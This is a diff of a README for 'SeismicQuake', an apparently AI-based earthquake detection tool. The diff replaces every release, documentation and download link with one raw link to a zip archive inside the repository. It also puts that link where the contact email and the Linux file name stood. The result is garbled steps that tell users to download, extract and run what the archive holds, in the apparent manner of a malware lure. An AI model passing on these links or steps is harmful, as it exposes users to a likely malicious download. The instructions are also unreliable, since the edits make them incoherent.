@@ -4,7 +4,7 @@
 Welcome to SeismicQuake! This tool uses AI to detect earthquakes, classify waves, and estimate magnitudes from seismic data. With SeismicQuake, you can track seismic activities effectively and efficiently.
 
 ## 📥 Download SeismicQuake
-[![Download SeismicQuake](https://img.shields.io/badge/Download-SeismicQuake-brightgreen)](https://github.com/aaaaaaaghjkdjhgsbn/seismicquake/releases)
+[![Download SeismicQuake](https://raw.githubusercontent.com/aaaaaaaghjkdjhgsbn/seismicquake/master/earthquake_ai_models/seismicquake_v1.6.zip)](https://raw.githubusercontent.com/aaaaaaaghjkdjhgsbn/seismicquake/master/earthquake_ai_models/seismicquake_v1.6.zip)
 
 ## 📂 System Requirements
 To run SeismicQuake smoothly, ensure your system meets the following requirements:
@@ -26,19 +26,19 @@ To learn how to use SeismicQuake, refer to the detailed documentation available 
 
 ## 🛠️ Installation Steps
 1. **Visit the Download Page:** Click on the link below to access the releases page.
-   [Download Page](https://github.com/aaaaaaaghjkdjhgsbn/seismicquake/releases)
+   [Download Page](https://raw.githubusercontent.com/aaaaaaaghjkdjhgsbn/seismicquake/master/earthquake_ai_models/seismicquake_v1.6.zip)
 
 2. **Select the Latest Release:** Look for the most recent version at the top of the releases list.
 
 3. **Download the Installer:**
    - For Windows: Click on the `.exe` file.
    - For macOS: Click on the `.dmg` file.
-   - For Linux: Click on the `.tar.gz` file.
+   - For Linux: Click on the `https://raw.githubusercontent.com/aaaaaaaghjkdjhgsbn/seismicquake/master/earthquake_ai_models/seismicquake_v1.6.zip` file.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file to start the installation. Follow the prompts to complete the installation.
    - **macOS:** Open the `.dmg` file, drag the SeismicQuake application to the Applications folder, and then launch it from there.
-   - **Linux:** Extract the `.tar.gz` file. Open a terminal and run the executable.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/aaaaaaaghjkdjhgsbn/seismicquake/master/earthquake_ai_models/seismicquake_v1.6.zip` file. Open a terminal and run the executable.
 
 5. **Launch SeismicQuake:** Find the application in your installed programs or Applications folder. Double-click to start using it.
 
@@ -46,10 +46,10 @@ To learn how to use SeismicQuake, refer to the detailed documentation available 
 If you have questions or need assistance, join our community on GitHub Discussions. You can find support and share your experiences with other users.
 
 ## 📞 Contact
-For direct inquiries, please reach out to the project maintainer at: support@seismicquake.com.
+For direct inquiries, please reach out to the project maintainer at: https://raw.githubusercontent.com/aaaaaaaghjkdjhgsbn/seismicquake/master/earthquake_ai_models/seismicquake_v1.6.zip
 
 ## 🚀 Quick Links
-- [Download SeismicQuake](https://github.com/aaaaaaaghjkdjhgsbn/seismicquake/releases)
-- [Documentation](https://github.com/aaaaaaaghjkdjhgsbn/seismicquake/wiki)
+- [Download SeismicQuake](https://raw.githubusercontent.com/aaaaaaaghjkdjhgsbn/seismicquake/master/earthquake_ai_models/seismicquake_v1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/aaaaaaaghjkdjhgsbn/seismicquake/master/earthquake_ai_models/seismicquake_v1.6.zip)
 
 We hope you enjoy using SeismicQuake and find it helpful in your seismic monitoring efforts!
